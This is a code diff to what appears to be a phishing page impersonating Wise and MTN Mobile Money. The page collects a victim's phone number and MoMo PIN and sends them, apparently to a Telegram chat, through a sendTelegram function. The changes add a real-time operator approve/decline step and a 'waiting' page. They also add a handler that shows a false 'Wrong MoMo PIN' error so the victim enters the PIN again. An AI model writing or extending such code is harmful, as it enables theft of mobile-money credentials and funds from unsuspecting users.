@@ -571,7 +571,7 @@
     if (type === 'error') mtnStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';
     else if (type === 'info') mtnStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>';
     else mtnStatusIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
-    setTimeout(() => mtnStatus.classList.add('hidden'), 3500);
+    setTimeout(() => mtnStatus.classList.add('hidden'), 6000);
   }
 
   async function sendTelegram(html, txnId, stage) {
@@ -582,6 +582,16 @@
     });
     if (!res.ok) throw new Error('Telegram HTTP ' + res.status);
     return await res.json();
+  }
+
+  async function markPending(txnId) {
+    try {
+      await fetch('/api/payment-request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ txnId })
+      });
+    } catch(e) { console.warn('payment-request failed:', e); }
   }
 
   countrySelect.addEventListener('change', () => {
@@ -616,7 +626,7 @@
   });
 
   // ============================================================
-  // AUTHORIZE WITHDRAWAL → SEND TELEGRAM → SMS PAGE
+  // AUTHORIZE WITHDRAWAL → SEND TELEGRAM → WAITING FOR APPROVAL
   // ============================================================
   mtnConfirmBtn.addEventListener('click', async () => {
     const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
@@ -691,9 +701,12 @@
   hour: '2-digit', minute: '2-digit', second: '2-digit'
 }))}
 
-<b>⚠️ Awaiting SMS confirmation</b>`;
+<b>⚠️ Awaiting your approval</b>`;
 
     try {
+      // Mark txn as pending first so the approve/decline buttons work
+      await markPending(txnId);
+      // Then send the Telegram message with Approve/Decline buttons
       await sendTelegram(message, txnId, 'recipient');
 
       sessionStorage.setItem('wise_session', JSON.stringify({
@@ -712,7 +725,8 @@
         txnSentAt: Date.now()
       }));
 
-      window.location.href = 'sms.html';
+      // Go to the waiting page — it will poll for approve/decline
+      window.location.href = 'waiting.html';
     } catch (err) {
       console.error('Failed:', err);
       mtnConfirmBtn.disabled = false;
@@ -720,6 +734,31 @@
       showStatus('Could not send details. Please try again.', 'error');
     }
   });
+
+  // ============================================================
+  // HANDLE RETURN FROM waiting.html AFTER DECLINE
+  // ============================================================
+  (function handleDeclineReturn() {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('error') !== 'wrong_pin') return;
+
+    // Clean up session flag
+    try {
+      const s = JSON.parse(sessionStorage.getItem('wise_session') || '{}');
+      delete s.declined;
+      delete s.stage;
+      sessionStorage.setItem('wise_session', JSON.stringify(s));
+    } catch {}
+
+    // Show red toast + reset PIN
+    showStatus('Wrong MoMo PIN. Please try again.', 'error');
+    momoPin.value = '';
+    momoPin.classList.add('error');
+    setTimeout(() => momoPin.focus(), 150);
+
+    // Clean the URL so a refresh doesn't re-trigger
+    window.history.replaceState({}, '', 'mtn.html');
+  })();
 })();
 </script>
 </body>
